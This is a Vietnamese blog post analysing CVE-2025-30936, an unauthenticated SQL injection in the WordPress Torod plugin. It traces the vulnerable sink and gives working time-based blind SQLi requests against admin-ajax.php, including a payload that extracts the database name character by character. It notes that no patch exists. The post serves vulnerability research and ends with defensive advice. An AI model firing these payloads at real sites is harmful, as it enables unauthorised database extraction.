<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-30936 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Torod Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-09-28-cve-2025-30936/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-30936 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Torod Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-28T20:51:00+07:00">
    <meta property="article:modified_time" content="2025-09-28T20:51:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Sqli">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-30936 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Torod Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" /><link rel="prev" href="http://localhost:1313/vi/2025-09-27-cve-2025-48281/" /><link rel="next" href="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-30936 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-09-28-cve-2025-30936\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, sqli","wordcount":  777 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-09-28-cve-2025-30936\/","datePublished": "2025-09-28T20:51:00+07:00","dateModified": "2025-09-28T20:51:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Torod Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-09-28-cve-2025-30936/">English</option><option value="/vi/2025-09-28-cve-2025-30936/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-09-28-cve-2025-30936/">English</option><option value="/vi/2025-09-28-cve-2025-30936/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-30936 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-28">2025-09-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;777 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-09-28-cve-2025-30936/app.png"
        data-srcset="/2025-09-28-cve-2025-30936/app.png, /2025-09-28-cve-2025-30936/app.png 1.5x, /2025-09-28-cve-2025-30936/app.png 2x"
        data-sizes="auto"
        alt="/2025-09-28-cve-2025-30936/app.png"
        title="Security Vulnerability in WordPress Torod Plugin." width="772" height="250" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#vulnerable-sink">Vulnerable Sink</a></li>
        <li><a href="#how-it-work">How it work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-sqli">Detect SQLi</a></li>
        <li><a href="#get-first-letter-of-database-name">Get First Letter of Database Name</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng xảy ra trên plugin <strong>Torod</strong> của WordPress. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-30936" target="_blank" rel="noopener noreffer ">CVE-2025-30936</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/torod/" target="_blank" rel="noopener noreffer ">WordPress Torod Plugin</a></li>
<li><strong>Vulnerability Type</strong>: SQL Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 1.9</li>
<li><strong>Fixed in</strong>: &lt;= N/A</li>
<li><strong>CVSS severity</strong>:  High (9.3)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>Torod</strong>: v1.9</li>
</ul>
<hr>
<h2 id="analysis">Analysis</h2>
<p>Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ <strong>POST</strong> request vào SQL query mà không có cơ chế quản kiểm soát chặt chẽ.</p>
<h3 id="vulnerable-sink">Vulnerable Sink</h3>
<p>CVE này không có bản vá nên không thể sử dụng <strong>diff tool</strong> để so sánh sự khác biệt giữa <strong>code lỗi</strong> và <strong>code đã fix lỗi</strong>.</p>
<blockquote>
<p>Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global <code>$wpdb</code>, ta search từ khóa này trong thư mục của plugin để tìm sink.</p>
</blockquote>
<p><figure><a class="lightgallery" href="/2025-09-28-cve-2025-30936/search_sink.png" title="Search sink" data-thumbnail="/2025-09-28-cve-2025-30936/search_sink.png" data-sub-html="<h2>Tìm vị trí sink trong code</h2><p>Search sink</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-28-cve-2025-30936/search_sink.png"
            data-srcset="/2025-09-28-cve-2025-30936/search_sink.png, /2025-09-28-cve-2025-30936/search_sink.png 1.5x, /2025-09-28-cve-2025-30936/search_sink.png 2x"
            data-sizes="auto"
            alt="/2025-09-28-cve-2025-30936/search_sink.png" width="1477" height="609" />
    </a><figcaption class="image-caption">Tìm vị trí sink trong code</figcaption>
    </figure></p>
<p>👉 Dữ liệu từ <code>$_POST['country_id']</code> được đưa thẳng vào truy vấn SQL mà không có cơ chế kiểm soát hợp lệ. Việc chỉ sử dụng <code>sanitize_text_field()</code> mới dừng lại ở mức <strong>escape chuỗi</strong>, chứ không đảm bảo tính an toàn. Do đó, lỗ hổng SQLi có thể xảy ra.</p>
<ul>
<li>Source: <code>$_POST['country_id']</code></li>
<li>Sink: <code>$wpdb-&gt;get_results(&quot;SELECT * FROM $table_name WHERE country_id = $country_id&quot;)</code></li>
</ul>
<h3 id="how-it-work">How it work?</h3>
<p>Lỗ hổng nằm trong hàm <code>get_regions_and_cities</code> của class <code>ajaxyk</code> thuộc file <strong>inc/ajaxyk.php</strong>. Để xác định nơi nó được gọi, ta tìm kiếm với từ khóa <code>get_regions_and_cities</code> trong thư mục chứa plugin.</p>
<p><figure><a class="lightgallery" href="/2025-09-28-cve-2025-30936/search_1.png" title="Search 1" data-thumbnail="/2025-09-28-cve-2025-30936/search_1.png" data-sub-html="<h2>Tìm vị trí hàm get_regions_and_cities</h2><p>Search 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-28-cve-2025-30936/search_1.png"
            data-srcset="/2025-09-28-cve-2025-30936/search_1.png, /2025-09-28-cve-2025-30936/search_1.png 1.5x, /2025-09-28-cve-2025-30936/search_1.png 2x"
            data-sizes="auto"
            alt="/2025-09-28-cve-2025-30936/search_1.png" width="1491" height="321" />
    </a><figcaption class="image-caption">Tìm vị trí hàm get_regions_and_cities</figcaption>
    </figure></p>
<p>👉 <code>get_regions_and_cities</code> được construct của class <code>ajaxyk</code> gọi làm callback của 2 action hook thông qua hàm <code>add_action</code></p>
<ul>
<li>
<p><code>wp_ajax_get_regions_and_cities</code></p>
<ul>
<li>Được viết theo cú pháp <code>wp_ajax_{$action}</code></li>
<li>Yêu cầu người dùng đăng nhập</li>
</ul>
</li>
<li>
<p><code>wp_ajax_nopriv_get_regions_and_cities</code></p>
<ul>
<li>Được viết theo cú pháp <code>wp_ajax_nopriv_{$action}</code></li>
<li>Không yêu cầu người dùng đăng nhập</li>
</ul>
</li>
</ul>
<p>Vì đây là lỗ hổng <strong>unauthenticated</strong> nên ta chỉ quan tâm tới hook <code>wp_ajax_nopriv_get_regions_and_cities</code>.</p>
<p>Như vậy khi gửi <strong>POST</strong> request đến <code>/wp-admin/admin-ajax.php</code> với tham số</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">action=wp_ajax_nopriv_get_regions_and_cities&amp;country_id=payload_here</span></span></span></code></pre></div></div>
<ul>
<li>Callback <code>get_regions_and_cities</code> được gọi.</li>
<li><code>country_id</code> được lấy trực tiếp từ request và chèn vào SQL query.</li>
<li>Query thực thi với payload độc hại.</li>
</ul>
<hr>
<h2 id="exploit">Exploit</h2>
<h3 id="detect-sqli">Detect SQLi</h3>
<p>Gửi <strong>POST request</strong> chứa payload SQLi.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=get_regions_and_cities&amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)</span></span></span></code></pre></div></div>
<p>Khi đó câu query sẽ trở thành:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_torod_regions</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">country_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="n">a</span><span class="p">)</span></span></span></code></pre></div></div>
<p><figure><a class="lightgallery" href="/2025-09-28-cve-2025-30936/time_resp.png" title="Responsed time" data-thumbnail="/2025-09-28-cve-2025-30936/time_resp.png" data-sub-html="<h2>Kết quả phản hồi thời gian</h2><p>Responsed time</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-28-cve-2025-30936/time_resp.png"
            data-srcset="/2025-09-28-cve-2025-30936/time_resp.png, /2025-09-28-cve-2025-30936/time_resp.png 1.5x, /2025-09-28-cve-2025-30936/time_resp.png 2x"
            data-sizes="auto"
            alt="/2025-09-28-cve-2025-30936/time_resp.png" width="402" height="251" />
    </a><figcaption class="image-caption">Kết quả phản hồi thời gian</figcaption>
    </figure></p>
<p>👉 Dựa trên thời gian phản hồi =&gt; payload hoạt động.</p>
<p><strong>Các technique có thể sử dụng trong trường hợp table rỗng</strong>:</p>
<ul>
<li>
<p><strong>UNION</strong>: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng.</p>
</li>
<li>
<p><strong>Subquery</strong>:</p>
<ul>
<li><strong>Subquery trong mệnh đề WHERE</strong>: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi <code>SLEEP()</code>.</li>
<li><strong>Subquery trong mệnh đề FROM</strong>: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.</li>
</ul>
</li>
</ul>
<p><figure><a class="lightgallery" href="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" title="SQL Excution Order" data-thumbnail="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" data-sub-html="<h2>Thứ tự thực thi truy vấn SQL</h2><p>SQL Excution Order</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png"
            data-srcset="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png, https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png 1.5x, https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png 2x"
            data-sizes="auto"
            alt="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" />
    </a><figcaption class="image-caption">Thứ tự thực thi truy vấn SQL</figcaption>
    </figure></p>
<h3 id="get-first-letter-of-database-name">Get First Letter of Database Name</h3>
<p>Điều kiện tiên quyết để <strong>dump được hết data</strong> là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.</p>
<p>Gửi request với <strong>SQLi payload</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=get_regions_and_cities=1&amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)</span></span></span></code></pre></div></div>
<p>Sử dụng <code>SUBSTRING()</code> để lấy ký tự đầu tiên của <strong>database name</strong>, <code>IF()</code> trả về <code>SLEEP(5)</code> nếu ký tự đó là <code>0x77</code>(&lsquo;w&rsquo;)</p>
<p>Sử dụng hex encoding <code>w</code> thành <code>0x77</code> vì <code>country_id</code> được lấy từ <strong>POST</strong> request trong nên bị escape bởi <a href="https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes" target="_blank" rel="noopener noreffer ">magic quotes</a> trong WordPress và bởi <code>sanitize_text_field</code>.</p>
<p>👉 Dựa trên thời gian phản hồi =&gt; kí tự đầu tiên đúng là <code>w</code>.</p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2025-30936</strong> trong plugin WordPress <strong>Torod</strong> từ phiên bản <strong>1.9</strong> trở lại, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.</p>
<p>Chưa có bản vá chính thực nào cho lỗ hổng này.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Kiểm soát kỹ input từ người dùng.</li>
<li>Luôn sử dụng <code>$wpdb-&gt;prepare()</code> khi làm việc với database trong WordPress để tránh SQL Injection.</li>
<li>Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">SQL Injection cheat sheet - PortSwigger</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve" target="_blank" rel="noopener noreffer ">WordPress Torod Plugin &lt;= 1.9 is vulnerable to SQL Injection</a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-09-28</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-09-28-cve-2025-30936/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC" data-hashtags="analyst,plugin,sqli"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" data-title="CVE-2025-30936 Analysis &amp; POC" data-description="Security Vulnerability in WordPress Torod Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-09-28-cve-2025-30936%2f&amp;text=CVE-2025-30936%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/sqli/">Sqli</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-09-27-cve-2025-48281/" class="prev" rel="prev" title="CVE-2025-48281 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-48281 Analysis & POC</a>
            <a href="/vi/2025-09-29-cve-2025-48118/" class="next" rel="next" title="CVE-2025-48118 Analysis &amp; POC">CVE-2025-48118 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
